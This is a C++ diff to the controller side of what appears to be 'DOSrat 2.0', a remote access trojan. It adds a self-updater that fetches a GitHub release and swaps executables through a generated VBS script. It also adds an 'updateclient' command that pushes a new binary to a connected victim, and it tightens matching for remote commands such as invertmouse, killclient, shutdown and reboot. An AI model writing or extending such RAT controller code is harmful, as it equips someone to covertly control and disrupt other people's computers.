@@ -42,6 +42,55 @@ void StampaPrefix(string NomeClient = "")
     cout << "> ";
 }
 
+bool AutoAggiornamento()
+{
+    GitHub gh;
+    DirUtils du;
+    SystemUtils su;
+
+    du.SetCurrDir(du.GetModuleFilePath());
+
+    if (!du.CheckDir("Update"))
+        du.MakeDir("Update");
+
+    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", "Update\\"))
+        return false;
+
+    su.NoOutputCMD("PowerShell Expand-Archive Update\\DOSrat2.0.zip 'Update' -force");
+
+    du.DelFile("Update\\DOSrat2.0.zip");
+
+    if(!du.WriteFile("Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"DOSrat 2.0.exe\"\nfilesys.DeleteFile \"Build\\Client.exe\"\nfilesys.MoveFile \"Update\\DOSrat 2.0.exe\", \"DOSrat 2.0.exe\"\nfilesys.MoveFile \"Update\\Build\\Client.exe\", \"Build\\Client.exe\"\nWshShell.Run \"DOSrat 2.0.exe\", 1, false\nfilesys.DeleteFile \"Update.vbs\""))
+        return false;
+
+    su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");
+
+    return true;
+}
+
+void VerificaAggiornamenti(bool AutoUpdate)
+{
+    GitHub gh;
+    EasyMSGB msgb;
+    SystemUtils su;
+
+    string CurrTag = gh.GetRepoTag("criper98", "dosrat-2.0");
+
+    if (CurrTag != Version && CurrTag.find("-1 errore") == string::npos)
+    {
+        if (AutoUpdate)
+        {
+            if (AutoAggiornamento())
+                exit(0);
+        }
+        else
+        {
+            if (msgb.YesNo("Aggiornamento trovato!\nVuoi andare alla pagina ora?", msgb.Info, "DOSrat 2.0"))
+                su.OpenURL("https://github.com/Criper98/DOSrat-2.0/releases/latest");
+        }
+    }
+}
+
 void AccettaConnessioni(TcpIP& Server)
 {
     int c = 0;
@@ -243,6 +292,27 @@ bool Reboot(SOCKET Sock, int ID)
     return false;
 }
 
+short UpdateClient(SOCKET Sock, int ID)
+{
+    DirUtils du;
+
+    string FilePath = du.ChoseFileDialog("Client\0*.exe\0", du.GetModuleFilePath().c_str());
+
+    if (FilePath == "")
+        return 1;
+
+    if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath)))
+    {
+        Sleep(1000);
+        closesocket(Sock);
+        Clients[ID].IsConnected = false;
+        Clu->AggiornaTitolo();
+        return 0;
+    }
+
+    return -1;
+}
+
 void Sessione(int ID, SOCKET Sock)
 {
     CLInterface cli;
@@ -262,51 +332,60 @@ void Sessione(int ID, SOCKET Sock)
 
         Clients[ID].InTask = true;
 
-        if (cmd.find("getinfo") != string::npos)
+        if (cmd == "getinfo")
         {
             if (!GetInfo(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
         }
-        else if (cmd.find("invertmouse") != string::npos)
+        else if (cmd == "invertmouse")
         {
             if (!InvertMouse(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
         }
-        else if (cmd.find("exit") != string::npos || cmd.find("close") != string::npos)
+        else if (cmd == "exit" || cmd == "close")
             Controllo = false;
-        else if (cmd.find("reconnect") != string::npos)
+        else if (cmd == "reconnect")
         {
             if (!Reconnect(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
             else
                 Controllo = false;
         }
-        else if (cmd.find("clear") != string::npos || cmd.find("cls") != string::npos)
+        else if (cmd == "clear" || cmd == "cls")
         {
             system("cls");
             StampaTitolo(1);
             cli.SubTitle("Sessione Comandi", 60, tc.Green);
         }
-        else if (cmd.find("killclient") != string::npos)
+        else if (cmd == "killclient" || cmd == "kill")
         {
             if (!KillClient(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
             else
                 Controllo = false;
         }
-        else if (cmd.find("shutdown") != string::npos)
+        else if (cmd == "shutdown")
         {
             if (!Shutdown(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
             else
                 Controllo = false;
         }
-        else if (cmd.find("reboot") != string::npos)
+        else if (cmd == "reboot")
         {
             if (!Reboot(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
             else
                 Controllo = false;
+        }
+        else if (cmd == "updateclient")
+        {
+            switch (UpdateClient(Sock, ID))
+            {
+                case -1: Controllo = CheckConnection(Sock, ID); break;
+                case 0: Controllo = false; break;
+                case 1: break;
+            }
         }
         else
         {
